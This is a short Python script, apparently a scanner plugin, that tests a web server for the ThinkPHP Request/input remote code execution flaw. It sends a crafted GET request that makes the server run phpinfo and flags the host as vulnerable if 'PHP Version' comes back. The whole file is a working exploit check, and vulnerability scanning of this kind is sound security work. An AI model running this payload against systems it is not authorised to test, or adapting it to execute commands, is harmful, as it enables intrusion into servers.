import urllib
import requests


def verify(url):
    relsult = {
        'name': 'thinkphp_request_input_rce',
        'vulnerable': False
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\Request/input&filter=phpinfo&data=1')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"PHP Version" in req.text:
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = vurl
        return relsult
    except:
        return relsult